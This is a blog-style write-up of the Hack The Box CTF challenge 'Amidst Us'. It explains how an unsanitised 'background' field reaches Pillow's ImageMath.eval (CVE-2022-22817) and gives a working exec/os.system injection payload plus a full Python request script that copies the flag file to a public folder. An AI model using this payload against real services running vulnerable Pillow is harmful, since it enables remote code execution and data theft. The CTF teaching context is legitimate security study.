---
layout: post
title:  "HTB CTF - Amidst Us writeup"
date:   2022-05-20 08:30:00
tags: ["ctf-writeup"]
author: "Alex Ward"
---

On starting the container and visiting the site you are greeted
with a dark site with a "flash light" effect. Functionality is
limited, you can select a colour, and upload a file.

Inspecting the source there is a route `/api/alphafy` that accepts
some JSON, expected in the following format:

<!--more-->

```json
{
    "image": "string",
    "background": "array"
}
```

The vulnerability appears to be in the `ImageMath.eval` function
call in `make_alpha`:

```python
def make_alpha(data):
	color = data.get('background', [255,255,255])

	try:
		dec_img = base64.b64decode(data.get('image').encode())

		image = Image.open(BytesIO(dec_img)).convert('RGBA')
		img_bands = [band.convert('F') for band in image.split()]
		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}),
```

[CVE-2022-22817](https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-2331901)

There isn't any sanitising on the `"background"` input, so we can
use this for injecting a string into the eval function.

After finding a [valid tiny base64 encoded png](https://stackoverflow.com/a/36610159/7220776)
for the `"image"` input, it was time to craft a payload.

Tesing locally I had

```python
"exec(\"import os; os.system(\'cat ../flag.txt > ./application/static/uploads/flag.txt\');\")"
```

but it was causing the flask process to crash with a seg fault...

I tried my luck on the remote container, and thankfully there was a
restart policy in place, and the container came back up with the flag
where I wanted it.


```python
import requests

TARGET_HOST = "<host>:<port>"

res = requests.post(
    url=f"http://{TARGET_HOST}/api/alphafy",
    headers={
        "Content-Type": "application/json"
    },
    json={
        "image": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVQYV2NgYAAAAAMAAWgmWQ0AAAAASUVORK5CYII=",
        "background": [
            "exec(\"import os; os.system(\'cat /flag.txt > ./application/static/uploads/flag.txt\');\")", 255, 255]
    }
)
```